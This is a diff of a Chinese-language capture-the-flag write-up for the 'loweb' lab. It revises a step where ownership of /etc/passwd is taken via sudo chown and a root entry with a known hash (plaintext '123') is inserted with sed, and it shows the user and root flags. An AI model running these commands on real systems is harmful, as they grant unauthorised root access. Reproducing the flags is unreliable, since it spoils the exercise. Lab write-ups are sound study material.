@@ -54,16 +54,16 @@ r3dh4ck@loweb:~$ cat user.txt
 ed568ec0cd3aef96d4c17a7f02a8391e
 ```
 
-直接修改 /etc/passwd 所属主，然后修改密码字段：
+直接修改 /etc/passwd 所属主，然后修改密码字段(明文密码是 123)：
 
 ```
 sudo /usr/bin/chown r3dh4ck /etc/passwd
-root:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
+sed -i '1i root:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' /etc/passwd
 ```
 
 用新密码切换到 root，拿到 root flag:
 
 ```
-root1@loweb:~# cat r00t.txt
+root@loweb:~# cat r00t.txt
 f6a0195e175989b2f9dd92fe4e35d6e4
 ```
